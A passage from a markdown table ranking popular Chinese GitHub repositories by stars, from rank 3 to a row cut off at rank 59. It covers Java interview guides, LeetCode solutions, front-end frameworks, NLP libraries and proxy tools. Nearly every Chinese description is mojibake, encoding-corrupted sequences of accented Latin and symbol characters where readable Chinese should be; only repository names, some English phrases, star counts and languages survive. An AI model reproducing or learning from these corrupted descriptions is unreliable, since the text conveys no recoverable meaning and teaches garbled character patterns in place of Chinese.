|3|[Snailclimb/JavaGuide](https://github.com/Snailclimb/JavaGuide)|„ÄåJavaÂ≠¶‰π†+Èù¢ËØïÊåáÂçó„Äç‰∏Ä‰ªΩÊ∂µÁõñÂ§ßÈÉ®ÂàÜJavaÁ®ãÂ∫èÂëòÊâÄÈúÄË¶ÅÊéåÊè°ÁöÑÊ†∏ÂøÉÁü•ËØÜ„ÄÇÂáÜÂ§á Java Èù¢ËØïÔºåÈ¶ñÈÄâ JavaGuideÔºÅ|90.7k|Java|10/29|
|4|[justjavac/free-programming-books-zh_CN](https://github.com/justjavac/free-programming-books-zh_CN)|:books: ÂÖçË¥πÁöÑËÆ°ÁÆóÊú∫ÁºñÁ®ãÁ±ª‰∏≠Êñá‰π¶Á±çÔºåÊ¨¢ËøéÊäïÁ®ø|70.8k|-|09/04|
|5|[labuladong/fucking-algorithm](https://github.com/labuladong/fucking-algorithm)|Âà∑ÁÆóÊ≥ïÂÖ®Èù†Â•óË∑ØÔºåËÆ§ÂáÜ labuladong Â∞±Â§ü‰∫ÜÔºÅEnglish version supported! Crack LeetCode, not only how, but also why. |67.9k|-|10/29|
|6|[MisterBooo/LeetCodeAnimation](https://github.com/MisterBooo/LeetCodeAnimation)|Demonstrate all the questions on LeetCode in the form of animation.ÔºàÁî®Âä®ÁîªÁöÑÂΩ¢ÂºèÂëàÁé∞Ëß£LeetCodeÈ¢òÁõÆÁöÑÊÄùË∑ØÔºâ|60.3k|Java|09/30|
|7|[doocs/advanced-java](https://github.com/doocs/advanced-java)|üòÆ ‰∫íËÅîÁΩë Java Â∑•Á®ãÂ∏àËøõÈò∂Áü•ËØÜÂÆåÂÖ®Êâ´Áõ≤ÔºöÊ∂µÁõñÈ´òÂπ∂Âèë„ÄÅÂàÜÂ∏ÉÂºè„ÄÅÈ´òÂèØÁî®„ÄÅÂæÆÊúçÂä°„ÄÅÊµ∑ÈáèÊï∞ÊçÆÂ§ÑÁêÜÁ≠âÈ¢ÜÂüüÁü•ËØÜÔºåÂêéÁ´ØÂêåÂ≠¶ÂøÖÁúãÔºåÂâçÁ´ØÂêåÂ≠¶‰πüÂèØÂ≠¶‰π†|49.1k|Java|10/28|
|8|[xingshaocheng/architect-awesome](https://github.com/xingshaocheng/architect-awesome)|ÂêéÁ´ØÊû∂ÊûÑÂ∏àÊäÄÊúØÂõæË∞±|47.9k|-|08/25|
|9|[macrozheng/mall](https://github.com/macrozheng/mall)|mallÈ°πÁõÆÊòØ‰∏ÄÂ•óÁîµÂïÜÁ≥ªÁªüÔºåÂåÖÊã¨ÂâçÂè∞ÂïÜÂüéÁ≥ªÁªüÂèäÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºåÂü∫‰∫éSpringBoot+MyBatisÂÆûÁé∞ÔºåÈááÁî®DockerÂÆπÂô®ÂåñÈÉ®ÁΩ≤„ÄÇ ÂâçÂè∞ÂïÜÂüéÁ≥ªÁªüÂåÖÂê´È¶ñÈ°µÈó®Êà∑„ÄÅÂïÜÂìÅÊé®Ëçê„ÄÅÂïÜÂìÅÊêúÁ¥¢„ÄÅÂïÜÂìÅÂ±ïÁ§∫„ÄÅË¥≠Áâ©ËΩ¶„ÄÅËÆ¢ÂçïÊµÅÁ®ã„ÄÅ‰ºöÂëò‰∏≠ÂøÉ„ÄÅÂÆ¢Êà∑ÊúçÂä°„ÄÅÂ∏ÆÂä©‰∏≠ÂøÉÁ≠âÊ®°Âùó„ÄÇ ÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÂåÖÂê´ÂïÜÂìÅÁÆ°ÁêÜ„ÄÅËÆ¢ÂçïÁÆ°ÁêÜ„ÄÅ‰ºöÂëòÁÆ°ÁêÜ„ÄÅ‰øÉÈîÄÁÆ°ÁêÜ„ÄÅËøêËê•ÁÆ°ÁêÜ„ÄÅÂÜÖÂÆπÁÆ°ÁêÜ„ÄÅÁªüËÆ°Êä•Ë°®„ÄÅË¥¢Âä°ÁÆ°ÁêÜ„ÄÅÊùÉÈôêÁÆ°ÁêÜ„ÄÅËÆæÁΩÆÁ≠âÊ®°Âùó„ÄÇ|42.8k|Java|10/29|
|10|[scutan90/DeepLearning-500-questions](https://github.com/scutan90/DeepLearning-500-questions)|Ê∑±Â∫¶Â≠¶‰π†500ÈóÆÔºå‰ª•ÈóÆÁ≠îÂΩ¢ÂºèÂØπÂ∏∏Áî®ÁöÑÊ¶ÇÁéáÁü•ËØÜ„ÄÅÁ∫øÊÄß‰ª£Êï∞„ÄÅÊú∫Âô®Â≠¶‰π†„ÄÅÊ∑±Â∫¶Â≠¶‰π†„ÄÅËÆ°ÁÆóÊú∫ËßÜËßâÁ≠âÁÉ≠ÁÇπÈóÆÈ¢òËøõË°åÈòêËø∞Ôºå‰ª•Â∏ÆÂä©Ëá™Â∑±ÂèäÊúâÈúÄË¶ÅÁöÑËØªËÄÖ„ÄÇ ÂÖ®‰π¶ÂàÜ‰∏∫18‰∏™Á´†ËäÇÔºå50‰Ωô‰∏áÂ≠ó„ÄÇÁî±‰∫éÊ∞¥Âπ≥ÊúâÈôêÔºå‰π¶‰∏≠‰∏çÂ¶•‰πãÂ§ÑÊÅ≥ËØ∑ÂπøÂ§ßËØªËÄÖÊâπËØÑÊåáÊ≠£„ÄÇ   Êú™ÂÆåÂæÖÁª≠............ Â¶ÇÊúâÊÑèÂêà‰ΩúÔºåËÅîÁ≥ªscutjy2015@163.com                     ÁâàÊùÉÊâÄÊúâÔºåËøùÊùÉÂøÖÁ©∂       Tan 2018.06|41.2k|JavaScript|10/29|
|11|[azl397985856/leetcode](https://github.com/azl397985856/leetcode)| LeetCode Solutions: A Record of My Problem Solving Journey.( leetcodeÈ¢òËß£ÔºåËÆ∞ÂΩïËá™Â∑±ÁöÑleetcodeËß£È¢ò‰πãË∑Ø„ÄÇ)|37.5k|JavaScript|10/29|
|12|[bailicangdu/vue2-elm](https://github.com/bailicangdu/vue2-elm)|Âü∫‰∫é vue2 + vuex ÊûÑÂª∫‰∏Ä‰∏™ÂÖ∑Êúâ 45 ‰∏™È°µÈù¢ÁöÑÂ§ßÂûãÂçïÈ°µÈù¢Â∫îÁî®|34.7k|Vue|09/27|
|13|[521xueweihan/HelloGitHub](https://github.com/521xueweihan/HelloGitHub)|:octocat: Find pearls on open-source seashore ÂàÜ‰∫´ GitHub ‰∏äÊúâË∂£„ÄÅÂÖ•Èó®Á∫ßÁöÑÂºÄÊ∫êÈ°πÁõÆ|34.4k|Python|10/28|
|14|[justjavac/awesome-wechat-weapp](https://github.com/justjavac/awesome-wechat-weapp)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂºÄÂèëËµÑÊ∫êÊ±áÊÄª :100:|33.2k|-|10/28|
|15|[chinese-poetry/chinese-poetry](https://github.com/chinese-poetry/chinese-poetry)|The most comprehensive database of Chinese poetry üß∂ÊúÄÂÖ®‰∏≠ÂçéÂè§ËØóËØçÊï∞ÊçÆÂ∫ì,  ÂîêÂÆã‰∏§ÊúùËøë‰∏Ä‰∏áÂõõÂçÉÂè§ËØó‰∫∫,  Êé•Ëøë5.5‰∏áÈ¶ñÂîêËØóÂä†26‰∏áÂÆãËØó.  ‰∏§ÂÆãÊó∂Êúü1564‰ΩçËØç‰∫∫Ôºå21050È¶ñËØç„ÄÇ    ÈòøÈáåÊãõ Python P6/P7 ‰∏äÊµ∑Âº†Ê±ü, gaojunqi@outlook.com|30.1k|JavaScript|10/29|
|16|[0voice/interview_internal_reference](https://github.com/0voice/interview_internal_reference)|2020Âπ¥ÊúÄÊñ∞ÊÄªÁªìÔºåÈòøÈáåÔºåËÖæËÆØÔºåÁôæÂ∫¶ÔºåÁæéÂõ¢ÔºåÂ§¥Êù°Á≠âÊäÄÊúØÈù¢ËØïÈ¢òÁõÆÔºå‰ª•ÂèäÁ≠îÊ°àÔºå‰∏ìÂÆ∂Âá∫È¢ò‰∫∫ÂàÜÊûêÊ±áÊÄª„ÄÇ|29.2k|Python|10/17|
|17|[testerSunshine/12306](https://github.com/testerSunshine/12306)|12306Êô∫ËÉΩÂà∑Á•®ÔºåËÆ¢Á•®|28.8k|Python|09/26|
|18|[apachecn/AiLearning](https://github.com/apachecn/AiLearning)|AiLearning: Êú∫Âô®Â≠¶‰π† - MachineLearning - ML„ÄÅÊ∑±Â∫¶Â≠¶‰π† - DeepLearning - DL„ÄÅËá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜ NLP|27.6k|Python|10/27|
|19|[xitu/gold-miner](https://github.com/xitu/gold-miner)|ü•áÊéòÈáëÁøªËØëËÆ°ÂàíÔºåÂèØËÉΩÊòØ‰∏ñÁïåÊúÄÂ§ßÊúÄÂ•ΩÁöÑËã±ËØë‰∏≠ÊäÄÊúØÁ§æÂå∫ÔºåÊúÄÊáÇËØªËÄÖÂíåËØëËÄÖÁöÑÁøªËØëÂπ≥Âè∞Ôºö|27.4k|-|10/29|
|20|[NervJS/taro](https://github.com/NervJS/taro)|ÂºÄÊîæÂºèË∑®Á´ØË∑®Ê°ÜÊû∂Ëß£ÂÜ≥ÊñπÊ°àÔºåÊîØÊåÅ‰ΩøÁî® React/Vue/Nerv Á≠âÊ°ÜÊû∂Êù•ÂºÄÂèëÂæÆ‰ø°/‰∫¨‰∏ú/ÁôæÂ∫¶/ÊîØ‰ªòÂÆù/Â≠óËäÇË∑≥Âä®/ QQ Â∞èÁ®ãÂ∫è/H5 Á≠âÂ∫îÁî®„ÄÇ  https://taro.jd.com/|27.3k|JavaScript|10/30|
|21|[dcloudio/uni-app](https://github.com/dcloudio/uni-app)|uni-app ÊòØ‰ΩøÁî® Vue ËØ≠Ê≥ïÂºÄÂèëÂ∞èÁ®ãÂ∫è„ÄÅH5„ÄÅAppÁöÑÁªü‰∏ÄÊ°ÜÊû∂|26.5k|JavaScript|10/29|
|22|[Alvin9999/new-pac](https://github.com/Alvin9999/new-pac)|ÁßëÂ≠¶‰∏äÁΩë/Ëá™Áî±‰∏äÁΩë/ÁøªÂ¢ô/ËΩØ‰ª∂/ÊñπÊ≥ïÔºå‰∏ÄÈîÆÁøªÂ¢ôÊµèËßàÂô®ÔºåÂÖçË¥πshadowsocks/ss/ssr/v2ray/goflywayË¥¶Âè∑/ËäÇÁÇπÂàÜ‰∫´Ôºåvps‰∏ÄÈîÆÊê≠Âª∫ËÑöÊú¨/ÊïôÁ®ã|26.2k|-|09/27|
|23|[shengxinjing/programmer-job-blacklist](https://github.com/shengxinjing/programmer-job-blacklist)|:see_no_evil:Á®ãÂ∫èÂëòÊâæÂ∑•‰ΩúÈªëÂêçÂçïÔºåÊç¢Â∑•‰ΩúÂíåÂΩìÊäÄÊúØÂêà‰ºô‰∫∫ÈúÄË∞®ÊÖéÂïä Êõ¥Êñ∞ÊúâËµû|25.8k|Shell|07/03|
|24|[kon9chunkit/GitHub-Chinese-Top-Charts](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts)|:cn: GitHub‰∏≠ÊñáÊéíË°åÊ¶úÔºåÂ∏ÆÂä©‰Ω†ÂèëÁé∞È´òÂàÜ‰ºòÁßÄ‰∏≠ÊñáÈ°πÁõÆ„ÄÅÊõ¥È´òÊïàÂú∞Âê∏Êî∂ÂõΩ‰∫∫ÁöÑ‰ºòÁßÄÁªèÈ™åÊàêÊûúÔºõÊ¶úÂçïÊØèÂë®Êõ¥Êñ∞‰∏ÄÊ¨°ÔºåÊï¨ËØ∑ÂÖ≥Ê≥®ÔºÅ|25.7k|Java|10/24|
|25|[fighting41love/funNLP](https://github.com/fighting41love/funNLP)|‰∏≠Ëã±ÊñáÊïèÊÑüËØç„ÄÅËØ≠Ë®ÄÊ£ÄÊµã„ÄÅ‰∏≠Â§ñÊâãÊú∫/ÁîµËØùÂΩíÂ±ûÂú∞/ËøêËê•ÂïÜÊü•ËØ¢„ÄÅÂêçÂ≠óÊé®Êñ≠ÊÄßÂà´„ÄÅÊâãÊú∫Âè∑ÊäΩÂèñ„ÄÅË∫´‰ªΩËØÅÊäΩÂèñ„ÄÅÈÇÆÁÆ±ÊäΩÂèñ„ÄÅ‰∏≠Êó•Êñá‰∫∫ÂêçÂ∫ì„ÄÅ‰∏≠ÊñáÁº©ÂÜôÂ∫ì„ÄÅÊãÜÂ≠óËØçÂÖ∏„ÄÅËØçÊ±áÊÉÖÊÑüÂÄº„ÄÅÂÅúÁî®ËØç„ÄÅÂèçÂä®ËØçË°®„ÄÅÊö¥ÊÅêËØçË°®„ÄÅÁπÅÁÆÄ‰ΩìËΩ¨Êç¢„ÄÅËã±ÊñáÊ®°Êãü‰∏≠ÊñáÂèëÈü≥„ÄÅÊ±™Â≥∞Ê≠åËØçÁîüÊàêÂô®„ÄÅËÅå‰∏öÂêçÁß∞ËØçÂ∫ì„ÄÅÂêå‰πâËØçÂ∫ì„ÄÅÂèç‰πâËØçÂ∫ì„ÄÅÂê¶ÂÆöËØçÂ∫ì„ÄÅÊ±ΩËΩ¶ÂìÅÁâåËØçÂ∫ì„ÄÅÊ±ΩËΩ¶Èõ∂‰ª∂ËØçÂ∫ì„ÄÅËøûÁª≠Ëã±ÊñáÂàáÂâ≤„ÄÅÂêÑÁßç‰∏≠ÊñáËØçÂêëÈáè„ÄÅÂÖ¨Âè∏ÂêçÂ≠óÂ§ßÂÖ®„ÄÅÂè§ËØóËØçÂ∫ì„ÄÅITËØçÂ∫ì„ÄÅË¥¢ÁªèËØçÂ∫ì„ÄÅÊàêËØ≠ËØçÂ∫ì„ÄÅÂú∞ÂêçËØçÂ∫ì„ÄÅÂéÜÂè≤Âêç‰∫∫ËØçÂ∫ì„ÄÅËØóËØçËØçÂ∫ì„ÄÅÂåªÂ≠¶ËØçÂ∫ì„ÄÅÈ•ÆÈ£üËØçÂ∫ì„ÄÅÊ≥ïÂæãËØçÂ∫ì„ÄÅÊ±ΩËΩ¶ËØçÂ∫ì„ÄÅÂä®Áâ©ËØçÂ∫ì„ÄÅ‰∏≠ÊñáËÅäÂ§©ËØ≠Êñô„ÄÅ‰∏≠ÊñáË∞£Ë®ÄÊï∞ÊçÆ„ÄÅÁôæÂ∫¶‰∏≠ÊñáÈóÆÁ≠îÊï∞ÊçÆÈõÜ„ÄÅÂè•Â≠êÁõ∏‰ººÂ∫¶ÂåπÈÖçÁÆóÊ≥ïÈõÜÂêà„ÄÅbertËµÑÊ∫ê„ÄÅÊñáÊú¨ÁîüÊàê&ÊëòË¶ÅÁõ∏ÂÖ≥Â∑•ÂÖ∑„ÄÅcocoNLP‰ø°ÊÅØÊäΩÂèñ ...|25.6k|Python|10/02|
|26|[proxyee-down-org/proxyee-down](https://github.com/proxyee-down-org/proxyee-down)|http‰∏ãËΩΩÂ∑•ÂÖ∑ÔºåÂü∫‰∫éhttp‰ª£ÁêÜÔºåÊîØÊåÅÂ§öËøûÊé•ÂàÜÂùó‰∏ãËΩΩ|25.5k|Java|08/11|
|27|[houshanren/hangzhou_house_knowledge](https://github.com/houshanren/hangzhou_house_knowledge)|2017Âπ¥‰π∞ÊàøÁªèÂéÜÊÄªÁªìÂá∫Êù•ÁöÑ‰π∞ÊàøË¥≠ÊàøÁü•ËØÜÂàÜ‰∫´ÁªôÂ§ßÂÆ∂ÔºåÂ∏åÊúõÂØπÂ§ßÂÆ∂ÊúâÊâÄÂ∏ÆÂä©„ÄÇ‰π∞Êàø‰∏çÊòìÔºå‰∏î‰π∞‰∏îÁèçÊÉú„ÄÇSharing the knowledge of buy an own house that according  to the experience at hangzhou in 2017 to all the people. It's not easy to buy a own house, so I hope that it would be useful to everyone.|24.5k|CSS|10/18|
|28|[fxsjy/jieba](https://github.com/fxsjy/jieba)|ÁªìÂ∑¥‰∏≠ÊñáÂàÜËØç|24.5k|Python|07/24|
|29|[ityouknow/spring-boot-examples](https://github.com/ityouknow/spring-boot-examples)|about learning Spring Boot via examples. Spring Boot ÊïôÁ®ã„ÄÅÊäÄÊúØÊ†àÁ§∫‰æã‰ª£Á†ÅÔºåÂø´ÈÄüÁÆÄÂçï‰∏äÊâãÊïôÁ®ã„ÄÇ |23.9k|Java|10/19|
|30|[alibaba/arthas](https://github.com/alibaba/arthas)|Alibaba Java Diagnostic Tool Arthas/Alibaba JavaËØäÊñ≠Âà©Âô®Arthas|23.5k|Java|10/29|
|31|[unknwon/the-way-to-go_ZH_CN](https://github.com/unknwon/the-way-to-go_ZH_CN)|„ÄäThe Way to Go„Äã‰∏≠ÊñáËØëÊú¨Ôºå‰∏≠ÊñáÊ≠£ÂºèÂêç„ÄäGo ÂÖ•Èó®ÊåáÂçó„Äã|23.4k|Go|10/22|
|32|[lib-pku/libpku](https://github.com/lib-pku/libpku)|Ë¥µÊ†°ËØæÁ®ãËµÑÊñôÊ∞ëÈó¥Êï¥ÁêÜ|22.9k|TeX|06/28|
|33|[ctripcorp/apollo](https://github.com/ctripcorp/apollo)|ApolloÔºàÈòøÊ≥¢ÁΩóÔºâÊòØÊê∫Á®ãÊ°ÜÊû∂ÈÉ®Èó®Á†îÂèëÁöÑÂàÜÂ∏ÉÂºèÈÖçÁΩÆ‰∏≠ÂøÉÔºåËÉΩÂ§üÈõÜ‰∏≠ÂåñÁÆ°ÁêÜÂ∫îÁî®‰∏çÂêåÁéØÂ¢É„ÄÅ‰∏çÂêåÈõÜÁæ§ÁöÑÈÖçÁΩÆÔºåÈÖçÁΩÆ‰øÆÊîπÂêéËÉΩÂ§üÂÆûÊó∂Êé®ÈÄÅÂà∞Â∫îÁî®Á´ØÔºåÂπ∂‰∏îÂÖ∑Â§áËßÑËåÉÁöÑÊùÉÈôê„ÄÅÊµÅÁ®ãÊ≤ªÁêÜÁ≠âÁâπÊÄßÔºåÈÄÇÁî®‰∫éÂæÆÊúçÂä°ÈÖçÁΩÆÁÆ°ÁêÜÂú∫ÊôØ„ÄÇ|22.7k|Java|10/24|
|34|[sentsin/layui](https://github.com/sentsin/layui)|ÈááÁî®Ëá™Ë∫´Ê®°ÂùóËßÑËåÉÁºñÂÜôÁöÑÂâçÁ´Ø UI Ê°ÜÊû∂ÔºåÈÅµÂæ™ÂéüÁîü HTML/CSS/JS ÁöÑ‰π¶ÂÜôÂΩ¢ÂºèÔºåÊûÅ‰ΩéÈó®ÊßõÔºåÊãøÊù•Âç≥Áî®„ÄÇ|22.6k|JavaScript|10/02|
|35|[formulahendry/955.WLB](https://github.com/formulahendry/955.WLB)|955 ‰∏çÂä†Áè≠ÁöÑÂÖ¨Âè∏ÂêçÂçï - Â∑•‰Ωú 955Ôºåwork‚Äìlife balance (Â∑•‰Ωú‰∏éÁîüÊ¥ªÁöÑÂπ≥Ë°°)|22.6k|-|10/11|
|36|[alibaba/druid](https://github.com/alibaba/druid)|ÈòøÈáåÂ∑¥Â∑¥ËÆ°ÁÆóÂπ≥Âè∞‰∫ã‰∏öÈÉ®Âá∫ÂìÅÔºå‰∏∫ÁõëÊéßËÄåÁîüÁöÑÊï∞ÊçÆÂ∫ìËøûÊé•Ê±†|22.5k|Java|10/25|
|37|[alibaba/flutter-go](https://github.com/alibaba/flutter-go)|flutter ÂºÄÂèëËÄÖÂ∏ÆÂä© APPÔºåÂåÖÂê´ flutter Â∏∏Áî® 140+ ÁªÑ‰ª∂ÁöÑdemo ÊºîÁ§∫‰∏é‰∏≠ÊñáÊñáÊ°£|22.1k|Dart|10/13|
|38|[scwang90/SmartRefreshLayout](https://github.com/scwang90/SmartRefreshLayout)|üî•‰∏ãÊãâÂà∑Êñ∞„ÄÅ‰∏äÊãâÂä†ËΩΩ„ÄÅ‰∫åÁ∫ßÂà∑Êñ∞„ÄÅÊ∑òÂÆù‰∫åÊ•º„ÄÅRefreshLayout„ÄÅOverScrollÔºåAndroidÊô∫ËÉΩ‰∏ãÊãâÂà∑Êñ∞Ê°ÜÊû∂ÔºåÊîØÊåÅË∂äÁïåÂõûÂºπ„ÄÅË∂äÁïåÊãñÂä®ÔºåÂÖ∑ÊúâÊûÅÂº∫ÁöÑÊâ©Â±ïÊÄßÔºåÈõÜÊàê‰∫ÜÂá†ÂçÅÁßçÁÇ´ÈÖ∑ÁöÑHeaderÂíå Footer„ÄÇ|21.7k|Java|10/18|
|39|[hankcs/HanLP](https://github.com/hankcs/HanLP)|‰∏≠ÊñáÂàÜËØç ËØçÊÄßÊ†áÊ≥® ÂëΩÂêçÂÆû‰ΩìËØÜÂà´ ‰æùÂ≠òÂè•Ê≥ïÂàÜÊûê ËØ≠‰πâ‰æùÂ≠òÂàÜÊûê Êñ∞ËØçÂèëÁé∞ ÂÖ≥ÈîÆËØçÁü≠ËØ≠ÊèêÂèñ Ëá™Âä®ÊëòË¶Å ÊñáÊú¨ÂàÜÁ±ªËÅöÁ±ª ÊãºÈü≥ÁÆÄÁπÅËΩ¨Êç¢ Ëá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜ|21.1k|Python|10/29|
|40|[littlecodersh/ItChat](https://github.com/littlecodersh/ItChat)|A complete and graceful API for Wechat. ÂæÆ‰ø°‰∏™‰∫∫Âè∑Êé•Âè£„ÄÅÂæÆ‰ø°Êú∫Âô®‰∫∫ÂèäÂëΩ‰ª§Ë°åÂæÆ‰ø°Ôºå‰∏âÂçÅË°åÂç≥ÂèØËá™ÂÆö‰πâ‰∏™‰∫∫Âè∑Êú∫Âô®‰∫∫„ÄÇ|20.9k|Python|10/28|
|41|[Advanced-Frontend/Daily-Interview-Question](https://github.com/Advanced-Frontend/Daily-Interview-Question)|ÊàëÊòØÊú®ÊòìÊù®ÔºåÂÖ¨‰ºóÂè∑„ÄåÈ´òÁ∫ßÂâçÁ´ØËøõÈò∂„Äç‰ΩúËÄÖÔºåÊØèÂ§©ÊêûÂÆö‰∏ÄÈÅìÂâçÁ´ØÂ§ßÂéÇÈù¢ËØïÈ¢òÔºåÁ•ùÂ§ßÂÆ∂Â§©Â§©ËøõÊ≠•Ôºå‰∏ÄÂπ¥Âêé‰ºöÁúãÂà∞‰∏ç‰∏ÄÊ†∑ÁöÑËá™Â∑±„ÄÇ|20.8k|JavaScript|05/27|
|42|[Tencent/wepy](https://github.com/Tencent/wepy)|Â∞èÁ®ãÂ∫èÁªÑ‰ª∂ÂåñÂºÄÂèëÊ°ÜÊû∂|20.8k|JavaScript|10/04|
|43|[mqyqingfeng/Blog](https://github.com/mqyqingfeng/Blog)|ÂÜ¥ÁæΩÂÜôÂçöÂÆ¢ÁöÑÂú∞ÊñπÔºåÈ¢ÑËÆ°ÂÜôÂõõ‰∏™Á≥ªÂàóÔºöJavaScriptÊ∑±ÂÖ•Á≥ªÂàó„ÄÅJavaScript‰∏ìÈ¢òÁ≥ªÂàó„ÄÅES6Á≥ªÂàó„ÄÅReactÁ≥ªÂàó„ÄÇ|20.3k|-|07/21|
|44|[jobbole/awesome-python-cn](https://github.com/jobbole/awesome-python-cn)|PythonËµÑÊ∫êÂ§ßÂÖ®‰∏≠ÊñáÁâàÔºåÂåÖÊã¨ÔºöWebÊ°ÜÊû∂„ÄÅÁΩëÁªúÁà¨Ëô´„ÄÅÊ®°ÊùøÂºïÊìé„ÄÅÊï∞ÊçÆÂ∫ì„ÄÅÊï∞ÊçÆÂèØËßÜÂåñ„ÄÅÂõæÁâáÂ§ÑÁêÜÁ≠âÔºåÁî±‰ºØ‰πêÂú®Á∫øÊåÅÁª≠Êõ¥Êñ∞„ÄÇ|20.2k|Makefile|10/13|
|45|[Meituan-Dianping/mpvue](https://github.com/Meituan-Dianping/mpvue)|Âü∫‰∫é Vue.js ÁöÑÂ∞èÁ®ãÂ∫èÂºÄÂèëÊ°ÜÊû∂Ôºå‰ªéÂ∫ïÂ±ÇÊîØÊåÅ Vue.js ËØ≠Ê≥ïÂíåÊûÑÂª∫Â∑•ÂÖ∑‰ΩìÁ≥ª„ÄÇ|20.1k|JavaScript|09/09|
|46|[googlehosts/hosts](https://github.com/googlehosts/hosts)|ÈïúÂÉèÔºöhttps://scaffrey.coding.net/p/hosts/git / https://git.qvq.network/googlehosts/hosts|19.9k|-|08/26|
|47|[AobingJava/JavaFamily](https://github.com/AobingJava/JavaFamily)|„ÄêJavaÈù¢ËØï+JavaÂ≠¶‰π†ÊåáÂçó„Äë ‰∏Ä‰ªΩÊ∂µÁõñÂ§ßÈÉ®ÂàÜJavaÁ®ãÂ∫èÂëòÊâÄÈúÄË¶ÅÊéåÊè°ÁöÑÊ†∏ÂøÉÁü•ËØÜ„ÄÇ|19.8k|-|10/15|
|48|[SwiftGGTeam/the-swift-programming-language-in-chinese](https://github.com/SwiftGGTeam/the-swift-programming-language-in-chinese)|‰∏≠ÊñáÁâà Apple ÂÆòÊñπ Swift ÊïôÁ®ã„ÄäThe Swift Programming Language„Äã|19.8k|CSS|10/25|
|49|[byoungd/English-level-up-tips-for-Chinese](https://github.com/byoungd/English-level-up-tips-for-Chinese)|ÂèØËÉΩÊòØËÆ©‰Ω†ÂèóÁõäÂå™ÊµÖÁöÑËã±ËØ≠ËøõÈò∂ÊåáÂçó|19.7k|-|08/10|
|50|[geekxh/hello-algorithm](https://github.com/geekxh/hello-algorithm)|üåç ‰∏úÂçäÁêÉÊúÄÈÖ∑ÁöÑÂ≠¶‰π†È°πÁõÆ   1„ÄÅÊàëÂÜôÁöÑ‰∏âÂçÅ‰∏áÂ≠óÁÆóÊ≥ïÂõæËß£ 2„ÄÅÂçÉÊú¨ÂºÄÊ∫êÁîµÂ≠ê‰π¶ 3„ÄÅ100 Âº†ÊÄùÁª¥ÂØºÂõæ 4„ÄÅ100 ÁØáÂ§ßÂéÇÈù¢Áªè 5„ÄÅ30 ‰∏™Â≠¶‰π†‰∏ìÈ¢ò  üöÄ üöÄ üöÄ Âè≥‰∏äËßíÁÇπ‰∏™ starÔºåÂä†ÂÖ•Êàë‰ª¨‰∏á‰∫∫Â≠¶‰π†Áæ§ÔºÅEnglish SupportedÔºÅ|19.7k|Java|10/25|
|51|[FallibleInc/security-guide-for-developers](https://github.com/FallibleInc/security-guide-for-developers)|Security Guide for Developers (ÂÆûÁî®ÊÄßÂºÄÂèë‰∫∫ÂëòÂÆâÂÖ®È°ªÁü•)|19.3k|-|10/02|
|52|[kataras/iris](https://github.com/kataras/iris)|The fastest HTTP/2 Go Web Framework. AWS Lambda, gRPC, MVC, Unique Router, Websockets, Sessions, Test suite, Dependency Injection and more. A true successor of expressjs and laravel   Ë∞¢Ë∞¢ https://github.com/kataras/iris/issues/1329  |19.3k|Go|10/19|
|53|[fengdu78/Coursera-ML-AndrewNg-Notes](https://github.com/fengdu78/Coursera-ML-AndrewNg-Notes)|Âê¥ÊÅ©ËææËÄÅÂ∏àÁöÑÊú∫Âô®Â≠¶‰π†ËØæÁ®ã‰∏™‰∫∫Á¨îËÆ∞|19.3k|HTML|10/28|
|54|[QSCTech/zju-icicles](https://github.com/QSCTech/zju-icicles)|ÊµôÊ±üÂ§ßÂ≠¶ËØæÁ®ãÊîªÁï•ÂÖ±‰∫´ËÆ°Âàí|19.2k|HTML|10/24|
|55|[lenve/vhr](https://github.com/lenve/vhr)|ÂæÆ‰∫∫‰∫ãÊòØ‰∏Ä‰∏™ÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑ‰∫∫ÂäõËµÑÊ∫êÁÆ°ÁêÜÁ≥ªÁªüÔºåÈ°πÁõÆÈááÁî®SpringBoot+VueÂºÄÂèë„ÄÇ|19.0k|Java|10/15|
|56|[d2l-ai/d2l-zh](https://github.com/d2l-ai/d2l-zh)|„ÄäÂä®ÊâãÂ≠¶Ê∑±Â∫¶Â≠¶‰π†„ÄãÔºöÈù¢Âêë‰∏≠ÊñáËØªËÄÖ„ÄÅËÉΩËøêË°å„ÄÅÂèØËÆ®ËÆ∫„ÄÇËã±ÊñáÁâàÂç≥‰ºØÂÖãÂà©‚ÄúÊ∑±Â∫¶Â≠¶‰π†ÂØºËÆ∫‚ÄùÊïôÊùê„ÄÇ|19.0k|Python|10/29|
|57|[bannedbook/fanqiang](https://github.com/bannedbook/fanqiang)|ÁøªÂ¢ô-ÁßëÂ≠¶‰∏äÁΩë|18.9k|Rich Text Format|10/25|
|58|[ruanyf/es6tutorial](https://github.com/ruanyf/es6tutorial)|„ÄäECMAScript 6ÂÖ•Èó®„ÄãÊòØ‰∏ÄÊú¨ÂºÄÊ∫êÁöÑ JavaScript ËØ≠Ë®ÄÊïôÁ®ãÔºåÂÖ®Èù¢‰ªãÁªç ECMAScript 6 Êñ∞Â¢ûÁöÑËØ≠Ê≥ïÁâπÊÄß„ÄÇ|18.7k|JavaScript|10/27|
|59|[xkcoding/spring-boot-demo](https://github.com/xkcoding/spring-boot-demo)|spring boot demo ÊòØ‰∏Ä‰∏™Áî®Êù•Ê∑±Â∫¶Â≠¶‰π†Âπ∂ÂÆûÊàò spring boot ÁöÑÈ°πÁõÆÔºåÁõÆÂâçÊÄªÂÖ±ÂåÖÂê´ 65 ‰∏™ÈõÜÊàêdemoÔºåÂ∑≤ÁªèÂÆåÊàê 53 ‰∏™„ÄÇ  ËØ•È°πÁõÆÂ∑≤ÊàêÂäüÈõÜÊàê 